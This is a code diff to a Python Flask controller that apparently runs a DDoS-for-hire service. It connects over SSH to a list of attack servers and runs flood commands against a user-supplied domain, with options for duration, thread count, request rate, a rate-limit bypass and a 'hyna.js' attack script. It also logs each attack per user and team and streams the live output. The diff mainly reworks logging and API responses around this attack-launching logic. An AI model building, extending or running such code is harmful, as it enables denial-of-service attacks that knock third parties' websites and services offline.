@@ -32,6 +32,10 @@ class AttackController:
     def _streamOutput(self, channel, socketId, attackLogId, serverHostname, app):
         with app.app_context():
             fullOutput = ""
+            attackLog = AttackLog.query.get(attackLogId)
+            domain = attackLog.domainName
+            attack_time = attackLog.time
+            createdAt = attackLog.createdAt
             serverLog = AttackServerLog(
                 attackLogId=attackLogId,
                 serverHostname=serverHostname,
@@ -45,8 +49,14 @@ class AttackController:
                     output = channel.recv(4096).decode()
                     fullOutput += output
                     socketio.emit('log_message', {
-                        'data': output,
-                        'server': serverHostname
+                        'data': {
+                            'domain': domain,
+                            'attack_time': attack_time,
+                            'attack': attackLogId,
+                            'server': serverHostname
+                        },
+                        'status': 'success',
+                        'message': 'attack data',
                     }, room=socketId)
                 if channel.recv_stderr_ready():
                     errorOutput = channel.recv_stderr(4096).decode()
@@ -80,7 +90,6 @@ class AttackController:
             sshClient = paramiko.SSHClient()
             sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             sshClient.connect(hostName, username=userName, password=passWord)
-            
             if command.find("hyna.js") != -1:
                 sshClient.exec_command("pkill -9 xvfb-run; pkill -9 Xvfb")
             else:
@@ -118,8 +127,8 @@ class AttackController:
             return False, str(e)
 
     def _executeOnServers(self, attackCommand, socketId, attackLogId, serverList=None):
-        if not serverList:
-            serverList = ATTACK_SERVERS
+        # if not serverList:
+        #     serverList = ATTACK_SERVERS
 
         successfulServers = []
         errors = []
@@ -128,7 +137,7 @@ class AttackController:
             # Generate command using server-specific node path
             command = f"{attackCommand}"
             
-            print(f"Executing command on {server['hostName']}: {command}")
+            print(f"Executing command on {server['ip']}: {command}")
             success, error = self._executeRemoteCommand(
                 server['ip'],
                 server['username'],
@@ -220,8 +229,12 @@ class AttackController:
         servers_to_use = []
         
         if currentUser:
-            team = Team.query.get(currentUser['team_id'])        
+            team = None
+            if currentUser.get('team_id'):
+                team = Team.query.get(currentUser['team_id'])
+                
             if team:
+                # Nếu có team, sử dụng server của team
                 server_ids = team.servers  
                 if not server_ids:
                     return jsonify({
@@ -263,9 +276,10 @@ class AttackController:
             attackCommand = f'{modeValue} {domainName} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} {death_sword_http} {bypassRateLimitValue}'
         attackCommand = ' '.join(attackCommand.split())
         print(attackCommand)
+        print(servers_to_use)
         attackLog = AttackLog(
             userId=currentUser['id'],
-            domainName=domainName,
+            domainName=domainName,  
             time=int(attackTimeValue),
             concurrent=int(concurrentValue),
             request=int(requestCount),
@@ -274,7 +288,6 @@ class AttackController:
         )
         db.session.add(attackLog)
         db.session.commit()
-
         # Execute command on all specified servers with parameters instead of command
         successfulServers, errors = self._executeOnServers(
             attackCommand,
@@ -291,10 +304,10 @@ class AttackController:
 
         return jsonify({
             "status": "success",
-            "message": "Attack started. Check websocket for live logs.",
-            "attackLogId": attackLog.id,
-            "successfulServers": successfulServers,
-            "errors": errors if errors else None
+            "data": {
+                "attack": attackLog.id,
+            },
+            "message": 'Attack success'
         })
 
     def terminate_attack(self, logId: int):
@@ -344,13 +357,12 @@ class AttackController:
     def terminate_server_attack(self, logId: int, serverHostname: str):
         currentUser = request.currentUser
         attackLog = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()
-        
+
         if not attackLog:
             return jsonify({
                 "status": "error",
                 "message": "Attack log not found"
             }), 404
-
         if logId not in self.active_channels or serverHostname not in self.active_channels[logId]:
             return jsonify({
                 "status": "error",
